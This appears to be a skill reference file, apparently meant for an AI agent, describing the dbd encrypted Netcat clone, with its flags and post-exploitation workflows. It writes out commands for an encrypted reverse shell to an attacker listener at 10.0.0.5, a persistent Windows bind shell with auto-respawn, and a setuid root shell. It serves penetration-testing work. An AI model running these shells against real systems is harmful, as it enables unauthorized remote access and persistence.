---
name: dbd
description: A Netcat-clone designed for portability and security, featuring AES-CBC-128 + HMAC-SHA1 encryption. Use for establishing encrypted reverse shells, bind shells, or secure data transfer during post-exploitation, pivoting, or remote administration on both Unix-like and Windows systems.
---

# dbd

## Overview
dbd is a portable Netcat-clone that provides strong encryption (AES-CBC-128 + HMAC-SHA1). It supports program execution, continuous reconnection, and daemonization. It is primarily used for secure communication and remote shell access. Category: Post-Exploitation.

## Installation (if not already installed)
Assume dbd is already installed. If missing:

```bash
sudo apt install dbd
```

## Common Workflows

### Encrypted Reverse Shell (Unix)
On the listener (attacker):
```bash
dbd -l -p 4444 -v
```
On the target:
```bash
dbd -e /bin/bash 10.0.0.5 4444
```

### Persistent Encrypted Bind Shell (Windows)
On the target (Windows):
```bash
dbd -l -p 8080 -e cmd.exe -r 0 -c on -k MySecretKey
```
On the attacker:
```bash
dbd 192.168.1.50 8080 -k MySecretKey
```

### Encrypted Chat Mode with Prefixes
Listener:
```bash
dbd -l -p 9000 -P "Server" -H on
```
Client:
```bash
dbd <target_ip> 9000 -P "Client" -H on
```

## Complete Command Reference

### Usage Patterns
- **Connect (TCP):** `dbd [-options] host port`
- **Listen (TCP):** `dbd -l -p port [-options]`

### General Options

| Flag | Description |
|------|-------------|
| `-l` | Listen for incoming connection |
| `-p n` | Choose port to listen on, or source port to connect out from |
| `-a address` | Choose an address to listen on or connect out from |
| `-e prog` | Program to execute after connect (e.g., `-e cmd.exe` or `-e bash`) |
| `-r n` | Infinitely respawn/reconnect; pause for `n` seconds between attempts. `-r0` re-listens after disconnect (daemon mode) |
| `-c on\|off` | Encryption on/off (AES-CBC-128 + HMAC-SHA1). Default: `on` |
| `-k secret` | Override default phrase to use for encryption (must be shared between peers) |
| `-q` | Quiet mode; don't print anything (overrides `-v`) |
| `-v` | Verbose output |
| `-n` | Toggle numeric-only IP addresses (skip DNS resolution). Specifying twice toggles back |
| `-m` | Toggle monitoring (snooping) on/off (used with `-e`). Also enabled via `-vv` |
| `-P prefix` | Add prefix (+ hardcoded separator) to all outbound data (useful for chat) |
| `-H on\|off` | Highlight incoming data with color escape sequences. Default: `off` |
| `-V` | Print version banner and exit |

### Unix-like OS Specific Options

| Flag | Description |
|------|-------------|
| `-s` | Invoke a shell. If dbd is setuid 0, it invokes a root shell |
| `-w n` | "Immobility timeout" in seconds for idle read/write and program execution (`-e`) |
| `-D on\|off` | Fork and run in background (daemonize). Default: `off` |

## Notes
- **Encryption:** Encryption is enabled by default. Both sides must use the same key (`-k`) and encryption state (`-c`).
- **Persistence:** Use `-r 0` on a listener to make it automatically restart after a client disconnects.
- **Security:** While dbd provides encryption, ensure the secret key (`-k`) is sufficiently complex to prevent brute-force attacks on the handshake.